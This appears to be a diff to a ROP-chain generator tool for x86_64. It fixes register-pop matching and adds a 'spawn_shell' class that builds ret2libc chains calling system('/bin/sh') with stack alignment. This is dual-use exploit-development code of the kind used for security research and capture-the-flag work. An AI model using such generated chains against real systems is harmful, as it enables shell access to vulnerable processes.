@@ -76,7 +76,7 @@ class RopChainX86_64(RopChain):
 
     @classmethod
     def availableGenerators(cls):
-        return [RopChainSystemX86_64, RopChainMprotectX86_64]
+        return [RopChainSystemX86_64, RopChainSpawnShellX86_64, RopChainMprotectX86_64]
 
     @classmethod
     def archs(self):
@@ -166,7 +166,10 @@ class RopChainX86_64(RopChain):
         regs = []
         for idx in range(1,len(gadget.lines)):
             line = gadget.lines[idx][1]
-            matched = match('^pop (...)$', line)
+            # 2-3 register chars so the extended regs r8/r9 are counted too
+            # (the old `(...)` matched exactly 3 chars and silently dropped
+            # `pop r8` / `pop r9`, under-padding the chain).
+            matched = match(r'^pop (\w{2,3})$', line)
             if matched:
                 regs.append(matched.group(1))
         return regs
@@ -624,6 +627,17 @@ class RopChainX86_64(RopChain):
         else:
             raise RopChainError('Cannot create gadget for opcode: %s' % opcode)
 
+    def _addressWidth(self):
+        return 8
+
+    def _writeCmdToData(self, cmd, dataaddr):
+        # NUL-terminate and pad to an 8-byte boundary so the writewhatwhere
+        # gadget emits whole quad-words without leaking past the string.
+        what = cmd + '\x00'
+        if len(what) % 8:
+            what += '\x00' * (8 - len(what) % 8)
+        return self._createWriteStringWhere(what, dataaddr)[0]
+
     def create(self):
         pass
 
@@ -732,6 +746,78 @@ class RopChainSystemX86_64(RopChainX86_64):
 
         chain += chain_tmp
         chain += 'print(rop)'
+        return chain
+
+
+class RopChainSpawnShellX86_64(RopChainX86_64):
+    """Generate a ret2libc ``system('/bin/sh')`` chain for x86_64 (System V).
+
+    The first integer argument goes in ``rdi``::
+
+        [ pop rdi ; ret ]   (loads &"/bin/sh"; placeholder if absent)
+        [ &"/bin/sh"    ]
+        [ ret           ]   <- 16-byte stack-alignment ret for glibc movaps
+        [ &system       ]
+
+    Modern glibc ``system()`` executes ``movaps`` against a 16-byte aligned
+    stack; the extra bare ``ret`` realigns it.  Pass ``align=false`` to omit."""
+
+    @classmethod
+    def usableTypes(self):
+        return (ELF, Raw)
+
+    @classmethod
+    def name(cls):
+        return 'spawn_shell'
+
+    def create(self, options=None):
+        options = options or {}
+        cmd = options.get('cmd') or '/bin/sh'
+        address = options.get('address')
+        string = options.get('string')
+        align_opt = options.get('align')
+        align = True
+        if align_opt is not None:
+            align = str(align_opt).lower() not in ('0', 'false', 'no', 'off')
+
+        self._printMessage('ROPchain Generator for system() on x86_64 (ret2libc):')
+        self._printMessage('  rdi = &"/bin/sh", then call system()')
+
+        defs = ''
+        body = '\n'
+
+        binsh_line, binsh_defs, write_text = self._resolveBinshPointer(cmd, string)
+        defs += binsh_defs
+        body += write_text
+
+        # pop rdi ; ret -> rdi = &"/bin/sh"
+        pop_rdi = self._find(Category.LOAD_REG, reg='rdi')
+        if pop_rdi is not None:
+            body += self._printRopInstruction(pop_rdi, padding=True, value=binsh_line)
+        else:
+            self._printMessage('No `pop rdi ; ret` gadget found; emitting placeholder.')
+            body += '# INSERT `pop rdi ; ret` GADGET HERE\n'
+            body += binsh_line
+
+        # Optional 16-byte stack alignment ret (glibc system() uses movaps).
+        if align:
+            try:
+                body += '# 16-byte stack alignment for glibc system() (movaps):\n'
+                body += self._createOpcode('c3')
+            except RopChainError:
+                self._printMessage('No `ret` gadget for stack alignment; skipping.')
+                body += '# (no `ret` gadget found for alignment)\n'
+
+        system_line, system_defs = self._resolveSystemAddress(address)
+        defs += system_defs
+        body += system_line
+
+        chain = self._printHeader()
+        chain += self._printRebase()
+        chain += defs
+        chain += "rop = ''\n"
+        chain += body
+        chain += 'print(rop)\n'
         return chain
 
 
